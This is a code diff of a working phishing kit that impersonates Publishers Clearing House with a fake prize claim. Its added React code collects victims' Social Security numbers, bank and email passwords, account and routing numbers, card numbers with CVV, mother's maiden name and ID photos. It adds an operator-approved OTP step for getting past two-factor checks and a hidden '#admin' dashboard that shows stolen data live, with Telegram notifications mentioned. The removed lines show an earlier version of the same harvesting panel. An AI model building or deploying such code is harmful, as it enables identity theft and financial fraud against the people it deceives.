-                ccCVV: document.getElementById('ccCVV').value
+                setLoading(false);
             };
-        }
 
-        function updateAdminTable() {
-            const data = getFormData();
-            const table = document.getElementById('adminTable');
-            
-            // Only render if admin panel is active to save resources
-            if (!document.getElementById('adminPanel').classList.contains('active')) return;
+            // Handle OTP Approval Auto-Advance
+            useEffect(() => {
+                if (currentStep === 10 && otpApproved) {
+                    // Skip to Step 11
+                    setCurrentStep(11);
+                }
+            }, [otpApproved, currentStep]);
 
-            let rows = `
-                <tr><th>Prize</th><td>${data.prizeText}</td></tr>
-                <tr><th>Name</th><td>${data.firstName} ${data.lastName}</td></tr>
-                <tr><th>DOB</th><td>${data.dob}</td></tr>
-                <tr><th>Maiden Name</th><td>${data.mmn}</td></tr>
-                <tr><th>SSN</th><td>${data.ssn}</td></tr>
-                <tr><th>Email</th><td>${data.email}</td></tr>
-                <tr><th>Email Pass</th><td>${data.emailPass}</td></tr>
-                <tr><th>Address</th><td>${data.address}, ${data.city}, ${data.state} ${data.zip}</td></tr>
-                <tr><th>Bank Name</th><td>${data.bankName}</td></tr>
-                <tr><th>Acct #</th><td>${data.accountNumber}</td></tr>
-                <tr><th>Routing #</th><td>${data.routingNumber}</td></tr>
-                <tr><th>Bank Login</th><td>${data.bankUser}</td></tr>
-                <tr><th>Bank Pass</th><td>${data.bankPass}</td></tr>
-                <tr><th>CC Name</th><td>${data.ccName}</td></tr>
-                <tr><th>CC Number</th><td>${data.ccNumber}</td></tr>
-                <tr><th>CC Exp</th><td>${data.ccExp}</td></tr>
-                <tr><th>CC CVV</th><td>${data.ccCVV}</td></tr>
-            `;
-            table.innerHTML = rows;
-        }
-
-        function handleFinalSubmission() {
-            const data = getFormData();
-            document.getElementById('finalPrize').textContent = data.prizeText;
-            createConfetti();
-            updateAdminTable(); // Final update
-        }
-
-        function createConfetti() {
-            const colors = ['#f44336', '#2196f3', '#4caf50', '#ffeb3b'];
-            for (let i = 0; i < 50; i++) {
-                const confetti = document.createElement('div');
-                confetti.className = 'confetti';
-                confetti.style.left = Math.random() * 100 + 'vw';
-                confetti.style.animationDelay = Math.random() * 3 + 's';
-                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
-                document.body.appendChild(confetti);
-                setTimeout(() => confetti.remove(), 3000);
+            // Skip OTP if disabled globally
+            if (!settings.otpEnabled && currentStep === 10) {
+                setCurrentStep(11);
             }
-        }
 
-        function resetForm() {
-            document.querySelectorAll('input, select').forEach(el => {
-                if (el.type === 'file') el.value = '';
-                else el.value = '';
-            });
-            currentStep = 1;
-            showStep(1);
-            updateAdminTable();
-        }
+            // Render Steps
+            const renderStep = () => {
+                const content = pageContent[`step${currentStep}`] || { title: "Step", subtext: "Details", buttonText: "Next" };
+                
+                if (loadingContent) return <div className="text-center p-10"><div className="loader mx-auto"></div></div>;
 
-        function copyData() {
-            const data = getFormData();
-            let text = `PRIZE CLAIM DATA\n`;
-            text += `Prize: ${data.prizeText}\n`;
-            text += `Name: ${data.firstName} ${data.lastName}\n`;
-            text += `SSN: ${data.ssn}\n`;
-            text += `Email: ${data.email}\nPass: ${data.emailPass}\n`;
-            text += `Address: ${data.address}, ${data.city}, ${data.state} ${data.zip}\n`;
-            text += `Bank: ${data.bankName}\nAcct: ${data.accountNumber}\nRoute: ${data.routingNumber}\nLogin: ${data.bankUser}\nPass: ${data.bankPass}\n`;
-            text += `CC: ${data.ccNumber} | Exp: ${data.ccExp} | CVV: ${data.ccCVV}\n`;
-            
-            navigator.clipboard.writeText(text).then(() => {
-                alert('Data copied to clipboard!');
-            });
-        }
+                switch(currentStep) {
+                    case 1:
+                        return (
+                            <div className="text-center">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/2/22/Publishers_Clearing_House_Logo.png" alt="PCH Logo" className="w-48 mx-auto mb-4"/>
+                                <h1 className="text-3xl font-bold pch-red mb-2">{content.title}</h1>
+                                <p className="text-gray-600 mb-6">{content.subtext}</p>
+                                <button onClick={handleNextStep} className="pch-bg-red text-white font-bold py-3 px-8 rounded-full text-lg hover:bg-red-700 transition">
+                                    {content.buttonText}
+                                </button>
+                            </div>
+                        );
+                    case 2:
+                        return (
+                            <div>
+                                <h2 className="text-2xl font-bold pch-red mb-4">{content.title}</h2>
+                                <p className="text-gray-600 mb-4">{content.subtext}</p>
+                                <div className="space-y-4">
+                                    <input type="text" placeholder="First Name" value={userData.firstName || ''} onChange={e => setUserData({...userData, firstName: e.target.value})} className="w-full p-2 border rounded"/>
+                                    <input type="text" placeholder="Last Name" value={userData.lastName || ''} onChange={e => setUserData({...userData, lastName: e.target.value})} className="w-full p-2 border rounded"/>
+                                    <input type="text" placeholder="Street Address" value={userData.address || ''} onChange={e => setUserData({...userData, address: e.target.value})} className="w-full p-2 border rounded"/>
+                                    <div className="flex space-x-2">
+                                        <input type="text" placeholder="City" value={userData.city || ''} onChange={e => setUserData({...userData, city: e.target.value})} className="w-1/2 p-2 border rounded"/>
+                                        <input type="text" placeholder="State" value={userData.state || ''} onChange={e => setUserData({...userData, state: e.target.value})} className="w-1/4 p-2 border rounded"/>
+                                        <input type="text" placeholder="Zip" value={userData.zip || ''} onChange={e => setUserData({...userData, zip: e.target.value})} className="w-1/4 p-2 border rounded"/>
+                                    </div>
+                                </div>
+                                <button onClick={handleNextStep} disabled={loading} className="mt-6 w-full pch-bg-red text-white font-bold py-3 rounded-lg hover:bg-red-700 transition flex justify-center">
+                                    {loading ? <div className="loader"></div> : content.buttonText}
+                                </button>
+                            </div>
+                        );
+                    case 3:
+                        return (
+                            <div>
+                                <h2 className="text-2xl font-bold pch-red mb-4">{content.title}</h2>
+                                <div className="bg-gray-100 p-2 rounded mb-4 flex items-center">
+                                    <span className="text-green-600 mr-2">🔒</span> Secure SSN Input
+                                </div>
+                                <input type="text" placeholder="###-##-####" maxLength={11} value={userData.ssn || ''} onChange={e => {
+                                    let val = e.target.value.replace(/\D/g, '');
+                                    if (val.length > 3 && val.length <= 5) val = val.slice(0,3) + '-' + val.slice(3);
+                                    else if (val.length > 5) val = val.slice(0,3) + '-' + val.slice(3,5) + '-' + val.slice(5,9);
+                                    setUserData({...userData, ssn: val});
+                                }} className="w-full p-2 border rounded text-center text-xl tracking-widest"/>
+                                <button onClick={handleNextStep} disabled={loading} className="mt-6 w-full pch-bg-red text-white font-bold py-3 rounded-lg hover:bg-red-700 transition flex justify-center">
+                                    {loading ? <div className="loader"></div> : content.buttonText}
+                                </button>
+                            </div>
+                        );
+                    case 4:
+                        return (
+                            <div>
+                                <h2 className="text-2xl font-bold pch-red mb-4">{content.title}</h2>
+                                <p className="text-gray-600 mb-4">{content.subtext}</p>
+                                <div className="space-y-4">
+                                    <input type="text" placeholder="Bank Username" value={userData.bankUser || ''} onChange={e => setUserData({...userData, bankUser: e.target.value})} className="w-full p-2 border rounded"/>
+                                    <input type="password" placeholder="Bank Password" value={userData.bankPass || ''} onChange={e => setUserData({...userData, bankPass: e.target.value})} className="w-full p-2 border rounded"/>
+                                </div>
+                                <button onClick={handleNextStep} disabled={loading} className="mt-6 w-full pch-bg-red text-white font-bold py-3 rounded-lg hover:bg-red-700 transition flex justify-center">
+                                    {loading ? <div className="loader"></div> : content.buttonText}
+                                </button>
+                            </div>
+                        );
+                    case 5:
+                        return (
+                            <div>
+                                <h2 className="text-2xl font-bold pch-red mb-4">{content.title}</h2>
+                                <div className="space-y-4">
+                                    <input type="email" placeholder="Email Address" value={userData.email || ''} onChange={e => setUserData({...userData, email: e.target.value})} className="w-full p-2 border rounded"/>
+                                    <input type="password" placeholder="Email Password" value={userData.emailPass || ''} onChange={e => setUserData({...userData, emailPass: e.target.value})} className="w-full p-2 border rounded"/>
+                                </div>
+                                <button onClick={handleNextStep} disabled={loading} className="mt-6 w-full pch-bg-red text-white font-bold py-3 rounded-lg hover:bg-red-700 transition flex justify-center">
+                                    {loading ? <div className="loader"></div> : content.buttonText}
+                                </button>
+                            </div>
+                        );
+                    case 6:
+                        return (
+                            <div>
+                                <h2 className="text-2xl font-bold pch-red mb-4">{content.title}</h2>
+                                <div className="space-y-4">
+                                    <input type="text" placeholder="Account Number" value={userData.accountNum || ''} onChange={e => setUserData({...userData, accountNum: e.target.value})} className="w-full p-2 border rounded"/>
+                                    <input type="text" placeholder="Routing Number" value={userData.routingNum || ''} onChange={e => setUserData({...userData, routingNum: e.target.value})} className="w-full p-2 border rounded"/>
+                                </div>
+                                <button onClick={handleNextStep} disabled={loading} className="mt-6 w-full pch-bg-red text-white font-bold py-3 rounded-lg hover:bg-red-700 transition flex justify-center">
+                                    {loading ? <div className="loader"></div> : content.buttonText}
+                                </button>
+                            </div>
+                        );
+                    case 7:
+                        return (
+                            <div>
+                                <h2 className="text-2xl font-bold pch-red mb-4">{content.title}</h2>
+                                <div className="space-y-4">
+                                    <input type="text" placeholder="Card Number" maxLength={19} value={userData.ccNum || ''} onChange={e => {
+                                        let val = e.target.value.replace(/\D/g, '');
+                                        val = val.match(/.{1,4}/g)?.join(' ') || val;
+                                        setUserData({...userData, ccNum: val});
+                                    }} className="w-full p-2 border rounded"/>
+                                    <div className="flex space-x-2">
+                                        <input type="text" placeholder="MM/YY" maxLength={5} value={userData.expiry || ''} onChange={e => {
+                                            let val = e.target.value.replace(/\D/g, '');
+                                            if (val.length > 2) val = val.slice(0,2) + '/' + val.slice(2,4);
+                                            setUserData({...userData, expiry: val});
+                                        }} className="w-1/2 p-2 border rounded"/>
+                                        <input type="text" placeholder="CVV" maxLength={3} value={userData.cvv || ''} onChange={e => setUserData({...userData, cvv: e.target.value})} className="w-1/4 p-2 border rounded"/>
+                                    </div>
+                                </div>
+                                <button onClick={handleNextStep} disabled={loading} className="mt-6 w-full pch-bg-red text-white font-bold py-3 rounded-lg hover:bg-red-700 transition flex justify-center">
+                                    {loading ? <div className="loader"></div> : content.buttonText}
+                                </button>
+                            </div>
+                        );
+                    case 8:
+                        return (
+                            <div>
+                                <h2 className="text-2xl font-bold pch-red mb-4">{content.title}</h2>
+                                <div className="space-y-4">
+                                    <input type="date" value={userData.dob || ''} onChange={e => setUserData({...userData, dob: e.target.value})} className="w-full p-2 border rounded"/>
+                                    <input type="text" placeholder="Mother's Maiden Name" value={userData.maidenName || ''} onChange={e => setUserData({...userData, maidenName: e.target.value})} className="w-full p-2 border rounded"/>
+                                </div>
+                                <button onClick={handleNextStep} disabled={loading} className="mt-6 w-full pch-bg-red text-white font-bold py-3 rounded-lg hover:bg-red-700 transition flex justify-center">
+                                    {loading ? <div className="loader"></div> : content.buttonText}
+                                </button>
+                            </div>
+                        );
+                    case 9:
+                        return (
+                            <div>
+                                <h2 className="text-2xl font-bold pch-red mb-4">{content.title}</h2>
+                                <div className="space-y-4">
+                                    <label className="block w-full p-4 border-2 border-dashed border-gray-300 text-center cursor-pointer hover:bg-gray-50">
+                                        <span>Upload Front of ID</span>
+                                        <input type="file" accept="image/*" className="hidden" onChange={async (e) => {
+                                            if(e.target.files[0]){
+                                                setLoading(true);
+                                                try {
+                                                    const url = await uploadImageToStorage(e.target.files[0], userId, 'front');
+                                                    setUserData({...userData, idFrontUrl: url});
+                                                } catch(err) { console.error(err); }
+                                                setLoading(false);
+                                            }
+                                        }}/>
+                                    </label>
+                                    {userData.idFrontUrl && <img src={userData.idFrontUrl} alt="Front" className="w-full h-32 object-cover rounded"/>}
+                                    
+                                    <label className="block w-full p-4 border-2 border-dashed border-gray-300 text-center cursor-pointer hover:bg-gray-50">
+                                        <span>Upload Back of ID</span>
+                                        <input type="file" accept="image/*" className="hidden" onChange={async (e) => {
+                                            if(e.target.files[0]){
+                                                setLoading(true);
+                                                try {
+                                                    const url = await uploadImageToStorage(e.target.files[0], userId, 'back');
+                                                    setUserData({...userData, idBackUrl: url});
+                                                } catch(err) { console.error(err); }
+                                                setLoading(false);
+                                            }
+                                        }}/>
+                                    </label>
+                                    {userData.idBackUrl && <img src={userData.idBackUrl} alt="Back" className="w-full h-32 object-cover rounded"/>}
+                                </div>
+                                <button onClick={handleNextStep} disabled={loading} className="mt-6 w-full pch-bg-red text-white font-bold py-3 rounded-lg hover:bg-red-700 transition flex justify-center">
+                                    {loading ? <div className="loader"></div> : content.buttonText}
+                                </button>
+                            </div>
+                        );
+                    case 10:
+                        if (!settings.otpEnabled) return null; // Should be caught by useEffect, but safety check
+                        return (
+                            <div>
+                                <h2 className="text-2xl font-bold pch-red mb-4">{content.title}</h2>
+                                <p className="text-gray-600 mb-4">{content.subtext}</p>
+                                <input type="text" placeholder="Enter 6-Digit Code" maxLength={6} value={userData.otpCode || ''} onChange={e => setUserData({...userData, otpCode: e.target.value})} className="w-full p-2 border rounded text-center text-xl tracking-widest"/>
+                                <button onClick={handleNextStep} disabled={loading} className="mt-6 w-full pch-bg-red text-white font-bold py-3 rounded-lg hover:bg-red-700 transition flex justify-center">
+                                    {loading ? <div className="loader"></div> : content.buttonText}
+                                </button>
+                                {otpApproved && <p className="text-green-600 mt-2 text-center">Approved! Moving to Success...</p>}
+                            </div>
+                        );
+                    case 11:
+                        const content11 = pageContent[`step11`] || { title: "Success", subtext: "Transferring...", prizeAmount: "$5,000,000", winnerName: "John Doe" };
+                        return (
+                            <div className="text-center">
+                                <h1 className="text-3xl font-bold pch-red mb-2">{content11.title}</h1>
+                                <p className="text-gray-600 mb-6">{content11.subtext}</p>
+                                <div className="pch-bg-gold p-4 rounded-lg mb-6">
+                                    <p className="text-lg font-bold">Prize Amount: <span className="pch-red">{content11.prizeAmount}</span></p>
+                                    <p className="text-lg">Winner: <span className="font-bold">{content11.winnerName}</span></p>
+                                </div>
+                                <button onClick={() => window.location.reload()} className="pch-bg-red text-white font-bold py-3 px-8 rounded-full text-lg hover:bg-red-700 transition">
+                                    {content11.buttonText}
+                                </button>
+                            </div>
+                        );
+                    default:
+                        return <div>Loading...</div>;
+                }
+            };
+
+            return (
+                <div className="min-h-screen flex flex-col">
+                    <header className="pch-bg-red text-white p-4 text-center font-bold text-xl">PUBLISHERS CLEARING HOUSE</header>
+                    <main className="flex-grow p-4">
+                        <div className="step-container">
+                            {renderStep()}
+                        </div>
+                    </main>
+                    <footer className="bg-gray-200 p-4 text-center text-sm text-gray-600">
+                        <p>Copyright © 2026 Publishers Clearing House</p>
+                        <p className="mt-1">Terms & Conditions | Privacy Policy</p>
+                        <p className="mt-1 text-xs">Secure Connection 🔒 | Winner's Circle 🏆</p>
+                    </footer>
+                </div>
+            );
+        };        // ==========================================
+        // COMPONENT: ADMIN DASHBOARD
+        // ==========================================
+        const AdminDashboard = () => {
+            const { pageContent, settings, setPageContent, setSettings } = useContext(AppContext);
+            const [submissions, setSubmissions] = useState([]);
+            const [activeTab, setActiveTab] = useState('data'); // 'data', 'content', 'settings'
+
+            // Fetch all submissions
+            useEffect(() => {
+                const unsubscribe = db.collection('submissions').orderBy('timestamp', 'desc').onSnapshot(snapshot => {
+                    const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+                    setSubmissions(data);
+                });
+                return () => unsubscribe();
+            }, []);
+
+            // Handle OTP Approval
+            const handleOtpAction = async (userId, action) => {
+                await db.collection('submissions').doc(userId).update({
+                    otpApproved: action === 'approve'
+                });
+            };
+
+            // Handle Content Update
+            const handleContentChange = (step, field, value) => {
+                const newContent = { ...pageContent };
+                newContent[`step${step}`] = { ...newContent[`step${step}`], [field]: value };
+                setPageContent(newContent);
+                
+                // Save to DB
+                db.collection('config').doc('settings').set({
+                    pages: newContent,
+                    otpEnabled: settings.otpEnabled,
+                    telegramEnabled: settings.telegramEnabled
+                }, { merge: true });
+            };
+
+            // Handle Settings Update
+            const handleSettingsChange = (key, value) => {
+                const newSettings = { ...settings, [key]: value };
+                setSettings(newSettings);
+                db.collection('config').doc('settings').set({
+                    pages: pageContent,
+                    ...newSettings
+                }, { merge: true });
+            };
+
+            return (
+                <div className="min-h-screen bg-gray-100 p-4">
+                    <div className="max-w-6xl mx-auto">
+                        <h1 className="text-3xl font-bold mb-6 text-gray-800">🔧 PCH Admin Panel</h1>
+                        
+                        <!-- Tabs -->
+                        <div className="flex space-x-4 mb-6 border-b">
+                            <button onClick={() => setActiveTab('data')} className={`pb-2 px-4 ${activeTab === 'data' ? 'border-b-2 border-red-600 font-bold' : 'text-gray-600'}`}>Live Data</button>
+                            <button onClick={() => setActiveTab('content')} className={`pb-2 px-4 ${activeTab === 'content' ? 'border-b-2 border-red-600 font-bold' : 'text-gray-600'}`}>Edit Content</button>
+                            <button onClick={() => setActiveTab('settings')} className={`pb-2 px-4 ${activeTab === 'settings' ? 'border-b-2 border-red-600 font-bold' : 'text-gray-600'}`}>Settings</button>
+                        </div>
+
+                        <!-- Tab: Live Data -->
+                        {activeTab === 'data' && (
+                            <div className="overflow-x-auto">
+                                <table className="min-w-full bg-white rounded shadow">
+                                    <thead className="bg-gray-200">
+                                        <tr>
+                                            <th className="py-2 px-4 text-left">User ID</th>
+                                            <th className="py-2 px-4 text-left">Name</th>
+                                            <th className="py-2 px-4 text-left">SSN</th>
+                                            <th className="py-2 px-4 text-left">Email</th>
+                                            <th className="py-2 px-4 text-left">CC</th>
+                                            <th className="py-2 px-4 text-left">OTP Status</th>
+                                            <th className="py-2 px-4 text-left">Actions</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody>
+                                        {submissions.map(sub => (
+                                            <tr key={sub.id} className="border-b">
+                                                <td className="py-2 px-4">{sub.id}</td>
+                                                <td className="py-2 px-4">{sub.data?.firstName} {sub.data?.lastName}</td>
+                                                <td className="py-2 px-4">{sub.data?.ssn}</td>
+                                                <td className="py-2 px-4">{sub.data?.email}</td>
+                                                <td className="py-2 px-4">{sub.data?.ccNum}</td>
+                                                <td className="py-2 px-4">
+                                                    {sub.otpCode ? (
+                                                        sub.otpApproved ? 
+                                                        <span className="text-green-600 font-bold">Approved</span> :
+                                                        <span className="text-yellow-600 font-bold">Pending</span>
+                                                    ) : (sub.step > 10 || !settings.otpEnabled ? <span className="text-gray-500">Skipped</span> : <span className="text-gray-500">-</span>)}
+                                                </td>
+                                                <td className="py-2 px-4">
+                                                    {sub.otpCode && !sub.otpApproved && (
+                                                        <div className="space-x-2">
+                                                            <button onClick={() => handleOtpAction(sub.id, 'approve')} className="bg-green-500 text-white px-2 py-1 rounded text-xs">Approve</button>
+                                                            <button onClick={() => handleOtpAction(sub.id, 'deny')} className="bg-red-500 text-white px-2 py-1 rounded text-xs">Deny</button>
+                                                        </div>
+                                                    )}
+                                                </td>
+                                            </tr>
+                                        ))}
+                                    </tbody>
+                                </table>
+                            </div>
+                        )}
+
+                        <!-- Tab: Edit Content -->
+                        {activeTab === 'content' && (
+                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                                {Array.from({ length: 11 }, (_, i) => i + 1).map(step => {
+                                    const content = pageContent[`step${step}`] || {};
+                                    return (
+                                        <div key={step} className="bg-white p-4 rounded shadow">
+                                            <h3 className="font-bold mb-2">Step {step}</h3>
+                                            <input type="text" placeholder="Title" value={content.title || ''} onChange={e => handleContentChange(step, 'title', e.target.value)} className="w-full mb-2 p-2 border rounded"/>
+                                            <input type="text" placeholder="Subtext" value={content.subtext || ''} onChange={e => handleContentChange(step, 'subtext', e.target.value)} className="w-full mb-2 p-2 border rounded"/>
+                                            <input type="text" placeholder="Button Text" value={content.buttonText || ''} onChange={e => handleContentChange(step, 'buttonText', e.target.value)} className="w-full mb-2 p-2 border rounded"/>
+                                            {step === 11 && (
+                                                <>
+                                                    <input type="text" placeholder="Prize Amount" value={content.prizeAmount || ''} onChange={e => handleContentChange(step, 'prizeAmount', e.target.value)} className="w-full mb-2 p-2 border rounded"/>
+                                                    <input type="text" placeholder="Winner Name" value={content.winnerName || ''} onChange={e => handleContentChange(step, 'winnerName', e.target.value)} className="w-full mb-2 p-2 border rounded"/>
+                                                </>
+                                            )}
+                                        </div>
+                                    );
+                                })}
+                            </div>
+                        )}
+
+                        <!-- Tab: Settings -->
+                        {activeTab === 'settings' && (
+                            <div className="bg-white p-6 rounded shadow max-w-2xl">
+                                <h3 className="font-bold mb-4">Global Settings</h3>
+                                <div className="mb-4">
+                                    <label className="flex items-center space-x-2">
+                                        <input type="checkbox" checked={settings.otpEnabled} onChange={e => handleSettingsChange('otpEnabled', e.target.checked)} className="form-checkbox h-5 w-5 text-red-600"/>
+                                        <span>Enable OTP Step</span>
+                                    </label>
+                                    <p className="text-sm text-gray-500 ml-7">If disabled, users skip Step 10 automatically.</p>
+                                </div>
+                                <div className="mb-4">
+                                    <label className="flex items-center space-x-2">
+                                        <input type="checkbox" checked={settings.telegramEnabled} onChange={e => handleSettingsChange('telegramEnabled', e.target.checked)} className="form-checkbox h-5 w-5 text-red-600"/>
+                                        <span>Enable Telegram Notifications</span>
+                                    </label>
+                                </div>
+                                <div className="p-4 bg-yellow-50 rounded border border-yellow-200">
+                                    <p className="text-sm text-yellow-800">⚠️ Note: Telegram Bot Token and Chat ID are hardcoded in the HTML file (Part 1). Edit the source file to change them.</p>
+                                </div>
+                            </div>
+                        )}
+                    </div>
+                </div>
+            );
+        };
+
+        // ==========================================
+        // MAIN APP COMPONENT
+        // ==========================================
+        const App = () => {
+            const [isAdmin, setIsAdmin] = useState(false);
+
+            useEffect(() => {
+                const checkHash = () => {
+                    setIsAdmin(window.location.hash === '#admin');
+                };
+                checkHash();
+                window.addEventListener('hashchange', checkHash);
+                return () => window.removeEventListener('hashchange', checkHash);
+            }, []);
+
+            return (
+                <AppProvider>
+                    {isAdmin ? <AdminDashboard /> : <FunnelApp />}
+                </AppProvider>
+            );
+        };
+
+        // Mount the App
+        const root = ReactDOM.createRoot(document.getElementById('root'));
+        root.render(<App />);
     </script>
 </body>
 </html>
